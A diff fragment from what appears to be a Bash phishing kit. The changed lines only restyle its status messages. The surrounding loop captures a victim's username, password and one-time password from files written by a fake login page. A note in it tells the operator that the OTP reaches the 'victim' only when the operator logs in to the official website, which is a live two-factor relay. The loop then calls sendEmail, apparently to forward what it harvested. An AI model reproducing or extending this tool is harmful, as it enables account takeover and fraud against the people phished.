         if [[ -e "${www_dir}/usernames.txt" ]]; then
             capture_id
 		    capture_pass
-			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP >"
+			echo -ne "\n${info} Waiting for OTP >"
             echo -ne "\n${ITALICWHITE} NOTE : OTP will only be sent to victim when you login to offical website ${NA}"
         fi
 		if [[ -e "${www_dir}/otp.txt" ]]; then
 			capture_otp
-			echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
+			echo -e "\n${info} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
 		fi
         sleep 0.75
         sendEmail
